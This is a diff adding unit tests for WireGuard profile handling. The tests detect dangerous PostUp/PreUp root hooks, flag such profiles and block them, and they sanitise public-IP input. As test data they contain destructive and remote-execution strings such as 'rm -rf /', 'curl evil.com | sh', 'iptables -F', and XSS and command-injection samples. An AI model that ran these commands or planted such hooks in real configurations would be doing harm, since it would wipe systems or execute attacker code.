@@ -246,6 +246,41 @@ test("wgTargets handles empty profiles array", () => {
 
 // ---------------------------------------------------------------- security
 
+test("hasDangerousHooks detects PreUp/PostUp/PreDown/PostDown root execution directives", () => {
+  eq(Model.hasDangerousHooks("PostUp = rm -rf /"), true)
+  eq(Model.hasDangerousHooks("preup=curl evil.com | sh"), true)
+  eq(Model.hasDangerousHooks("  PostDown  = /usr/bin/touch /tmp/pwn"), true)
+  eq(Model.hasDangerousHooks("PreDown = iptables -F"), true)
+  eq(Model.hasDangerousHooks("# PostUp = commented out"), false)
+  eq(Model.hasDangerousHooks("; PreUp = commented out"), false)
+  eq(Model.hasDangerousHooks("[Interface]\nPrivateKey = abc\nAddress = 10.0.0.1/24\n[Peer]\nPublicKey = def\nEndpoint = 1.2.3.4:51820\nAllowedIPs = 0.0.0.0/0"), false)
+})
+
+test("parseProfileListing parses files and flags hook status", () => {
+  const sample = "/p/safe.conf\tsafe\n/p/evil.conf\thas_hooks\n"
+  const entries = Model.parseProfileListing(sample)
+  eq(entries.length, 2)
+  eq(entries[0].path, "/p/safe.conf")
+  eq(entries[0].hasHooks, false)
+  eq(entries[1].path, "/p/evil.conf")
+  eq(entries[1].hasHooks, true)
+})
+
+test("wgTargets blocks profiles with dangerous root hooks", () => {
+  const targets = Model.wgTargets([
+    { name: "safe_server", confFile: "/p/safe.conf", active: false, hasHooks: false },
+    { name: "evil_server", confFile: "/p/evil.conf", active: false, hasHooks: true }
+  ])
+  eq(targets.length, 2)
+  eq(targets[0].blocked, false)
+  eq(targets[0].detail, "WireGuard profile")
+  eq(targets[0].glyph, Model.GLYPH_SHIELD)
+  eq(targets[1].blocked, true)
+  eq(targets[1].hasHooks, true)
+  eq(targets[1].detail, "Blocked: contains root hooks")
+  eq(targets[1].glyph, Model.GLYPH_SHIELD_OFF)
+})
+
 test("parsePublicIp sanitizes against XSS, command injection, and SSRF payloads", () => {
   eq(Model.parsePublicIp("1.2.3.4; rm -rf /"), "")
   eq(Model.parsePublicIp("<script>alert(1)</script>"), "")
